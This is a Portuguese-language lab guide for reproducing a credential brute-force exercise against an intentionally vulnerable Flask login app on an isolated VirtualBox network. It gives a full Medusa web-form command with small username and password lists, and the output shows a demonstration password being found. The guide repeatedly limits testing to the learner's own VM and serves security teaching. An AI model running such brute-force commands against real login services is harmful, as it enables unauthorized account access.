# Guia de reprodução do laboratório

Este guia complementa o README e organiza os testes em etapas verificáveis. Execute apenas na sua própria máquina/VM e na rede Host-Only criada para o laboratório. Os comandos abaixo são executados a partir da raiz do repositório; a aplicação agora fica em `vulnerable/`.

## A. Conferir os endereços

No Windows, execute:

```bat
ipconfig
```

Identifique o adaptador `VirtualBox Host-Only Ethernet Adapter` e anote seu IPv4. No Kali:

```bash
ip -br addr
```

Confirme que a interface Host-Only possui um endereço na mesma sub-rede. Neste exercício, os exemplos foram `192.168.219.1` (Windows) e `192.168.219.10` (Kali). Use os valores reais do seu ambiente.

## B. Iniciar Flask

No CMD do Windows, dentro da pasta do projeto e com o venv ativado:

```bat
python vulnerable\app.py --host=192.168.219.1 --port=5000
```

Ajuste o IP do `--host` caso o seu adaptador Host-Only use outro endereço. Mantenha o servidor ativo durante os testes.

## C. Fazer uma requisição manual

No Kali, para conferir o caminho, a porta e o corpo da resposta:

```bash
curl -i -X POST --data-urlencode 'username=aluno' --data-urlencode 'password=Lab123!' http://192.168.219.1:5000/login
```

A versão em uma linha evita problemas com o uso de `\` como continuação. Se optar por quebrar linhas, a barra invertida deve ser o último caractere de cada linha.

## D. Criar listas com uma entrada por linha

```bash
printf '%s\n' admin gabriel aluno teste > users.txt
printf '%s\n' '123456' 'senha123' 'senha-incorreta-lab' 'Lab123!' > passwords.txt
cat -n users.txt
cat -n passwords.txt
```

Antes do Medusa, confirme que o primeiro arquivo tem 4 linhas e o segundo também. Não utilize `\` como delimitador dentro da linha. Para evitar publicar listas de trabalho, o `.gitignore` exclui os arquivos `users.txt` e `passwords.txt` da raiz. As listas versionadas e didáticas ficam em `wordlists/`.

## E. Ver as opções do módulo e executar o teste

```bash
medusa -M web-form -q
```

Confira que o módulo apresenta `FORM`, `FORM-DATA` e `DENY-SIGNAL`. Em seguida, com a aplicação local ativa:

```bash
medusa -h 192.168.219.1 -n 5000 -U users.txt -P passwords.txt -M web-form -m FORM:login -m 'FORM-DATA:POST?username=&password=' -m 'DENY-SIGNAL:LOGIN_FAILED' -t 1
```

### Resultado observado neste exercício

O módulo percorreu a lista e reportou a combinação de demonstração como `ACCOUNT FOUND ... User: aluno Password: Lab123! [SUCCESS]`.

Se o resultado for diferente, não assuma uma causa. Verifique em ordem: (1) IP/porta; (2) se Flask está escutando no adaptador correto; (3) se o log do Flask mostra um `POST /login`; (4) se os arquivos têm uma entrada por linha; (5) se os nomes `username`/`password`, o caminho `login` e o marcador `LOGIN_FAILED` coincidem com o formulário e a resposta. Execute apenas o alvo deste laboratório.

## F. Encerrar e limpar

- Pare o Flask com `Ctrl+C`.
- Remova as listas locais de teste se não precisar mais delas: `rm users.txt passwords.txt`.
- Não use este código em produção. Consulte `docs/seguranca-e-limitacoes.md` para o plano de correção.
